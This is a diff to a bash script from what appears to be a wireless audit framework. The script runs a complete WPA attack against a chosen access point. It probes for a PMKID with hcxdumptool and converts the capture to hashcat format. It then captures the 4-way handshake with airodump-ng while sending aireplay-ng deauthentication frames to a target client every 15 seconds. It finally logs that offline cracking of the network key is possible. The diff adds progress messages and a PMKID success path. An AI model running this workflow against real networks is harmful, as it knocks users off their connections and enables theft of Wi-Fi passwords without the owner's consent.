@@ -51,38 +51,65 @@ TEL_PID=$!
 
 # 2. Run Primary Tools
 RET=0
+PMKID_SUCCESS=0
+
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     # Phase 1: hcxdumptool PMKID capture
     FILTER_FILE=$(mktemp)
     echo "${BSSID}" | tr -d ':' | tr '[:upper:]' '[:lower:]' > "$FILTER_FILE"
-    timeout --foreground 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" || true
+    echo "[PMKID] Probing ${BSSID} for PMKID (15s)..."
+    timeout --foreground 15 hcxdumptool -i "$INTERFACE" --filterlist_ap="$FILTER_FILE" --filtermode=2 --enable_status=1 -o "${OUTPUT_BASE}_hcxdump.pcapng" 2>&1 || true
     rm -f "$FILTER_FILE"
 
     # Convert pcapng → hashcat 22000 format (PMKID + EAPOL)
     if [[ -f "${OUTPUT_BASE}_hcxdump.pcapng" ]]; then
         hcxpcapngtool "${OUTPUT_BASE}_hcxdump.pcapng" -o "${OUTPUT_BASE}_pmkid.hc22000" 2>/dev/null || true
     fi
+    if [[ -s "${OUTPUT_BASE}_pmkid.hc22000" ]]; then
+        echo "[PMKID] CAPTURED — PMKID extracted for ${BSSID}. Ready for offline crack."
+        PMKID_SUCCESS=1
+    else
+        echo "[PMKID] Not captured — AP may not support PMKID or was not in range during probe."
+        echo "[HANDSHAKE] Switching to 4-way handshake capture..."
+    fi
 
     # Phase 2: Handshake Capture
-    timeout --foreground "$CAPTURE_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" &
+    echo "[HANDSHAKE] Starting airodump-ng on channel ${CHANNEL:-6} — timeout ${CAPTURE_TIME}s..."
+    if [[ -n "$TARGET_CLIENT" ]]; then
+        echo "[HANDSHAKE] Target client ${TARGET_CLIENT} — deauth every 15s to force reconnect."
+    else
+        echo "[HANDSHAKE] No target client set — passive capture only. Run A4 first to select a client."
+    fi
+    timeout --foreground "$CAPTURE_TIME" airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
     AIRODUMP_PID=$!
-    
+
     HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
     ELAPSED=0
     SUCCESS=0
     while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
-        if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
-            aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" || true
+        if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED > 0 )) && (( ELAPSED % 15 == 0 )); then
+            echo "[DEAUTH] Sending deauth to ${TARGET_CLIENT} (${ELAPSED}s)..."
+            aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>/dev/null || true
         fi
         if [[ -f "$HANDSHAKE_FILE" ]]; then
             if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
+                echo "[HANDSHAKE] CAPTURED — Valid 4-way handshake detected at ${ELAPSED}s."
                 SUCCESS=1; break
+            fi
+        fi
+        if (( ELAPSED > 0 )) && (( ELAPSED % 10 == 0 )); then
+            REMAIN=$(( CAPTURE_TIME - ELAPSED ))
+            if [[ "${ASTRA_INDEFINITE:-}" == "true" ]]; then
+                echo "[${ELAPSED}s] Still listening... Press Ctrl+C to stop."
+            else
+                echo "[${ELAPSED}/${CAPTURE_TIME}s] Still waiting for handshake (${REMAIN}s remaining)..."
             fi
         fi
         sleep 2; ((ELAPSED+=2))
     done
     kill "$AIRODUMP_PID" 2>/dev/null || true
-    RET=$?
+    [[ $PMKID_SUCCESS -eq 1 ]] && SUCCESS=1
+    RET=0
 else
     # Background Execution
     (
@@ -96,19 +123,18 @@ else
             hcxpcapngtool "${OUTPUT_BASE}_hcxdump.pcapng" -o "${OUTPUT_BASE}_pmkid.hc22000" > /dev/null 2>&1 || true
         fi
 
-        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
+        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-6}" --write "${OUTPUT_BASE}_handshake" --output-format pcap "$INTERFACE" > /dev/null 2>&1 &
         AIRODUMP_PID=$!
-        
+
         HANDSHAKE_FILE="${OUTPUT_BASE}_handshake-01.cap"
         ELAPSED=0
-        SUCCESS=0
         while [[ "${ASTRA_INDEFINITE:-}" == "true" || $ELAPSED -lt $CAPTURE_TIME ]]; do
-            if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED % 15 == 0 )); then
+            if [[ -n "$TARGET_CLIENT" ]] && (( ELAPSED > 0 )) && (( ELAPSED % 15 == 0 )); then
                 aireplay-ng --deauth 5 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 || true
             fi
             if [[ -f "$HANDSHAKE_FILE" ]]; then
                 if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
-                    SUCCESS=1; break
+                    break
                 fi
             fi
             sleep 2; ((ELAPSED+=2))
@@ -129,10 +155,18 @@ if [[ -f "$HANDSHAKE_FILE" ]]; then
     cp "$HANDSHAKE_FILE" "$FINAL_FILE"
 fi
 
-# SUCCESS check (re-verify since we need the variable in this scope)
+# SUCCESS check — verify handshake and/or PMKID
 SUCCESS=0
+CAPTURE_TYPE=""
+PMKID_FILE="${OUTPUT_BASE}_pmkid.hc22000"
+
 if [[ -f "$FINAL_FILE" ]] && aircrack-ng "$FINAL_FILE" 2>/dev/null | grep -q "1 handshake"; then
     SUCCESS=1
+    CAPTURE_TYPE="4-way handshake"
+fi
+if [[ -s "$PMKID_FILE" ]]; then
+    SUCCESS=1
+    CAPTURE_TYPE="${CAPTURE_TYPE:+${CAPTURE_TYPE} + }PMKID"
 fi
 
 if [[ $SUCCESS -eq 1 ]]; then
@@ -140,21 +174,21 @@ if [[ $SUCCESS -eq 1 ]]; then
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
-        --name "WPA Handshake Captured" \
-        --desc "A valid 4-way WPA handshake was successfully intercepted for BSSID ${BSSID}." \
+        --name "WPA Material Captured: ${CAPTURE_TYPE}" \
+        --desc "Captured ${CAPTURE_TYPE} for BSSID ${BSSID}. Offline PSK cracking is now possible." \
         --severity CRITICAL \
         --evidence "$FINAL_FILE" \
-        --rationale "Capturing a handshake enables offline brute-force attacks."
+        --rationale "Offline brute-force of captured ${CAPTURE_TYPE} can recover the WPA PSK."
 else
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
         --type vulnerability \
-        --name "[$TC_ID] Audit Complete" \
-        --desc "Attempted to capture WPA handshake and PMKID for BSSID ${BSSID}." \
+        --name "[$TC_ID] Audit Complete — No material captured" \
+        --desc "Attempted PMKID probe and ${CAPTURE_TIME}s handshake capture for BSSID ${BSSID}. No WPA material obtained." \
         --severity INFO \
         --evidence "$FINAL_FILE" \
-        --rationale "Handshake capture requires active client association."
+        --rationale "Handshake capture requires a client to connect/reconnect during the capture window. Try running A4 first to identify active clients, then re-run D1 with a target client selected."
 fi
 
 "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
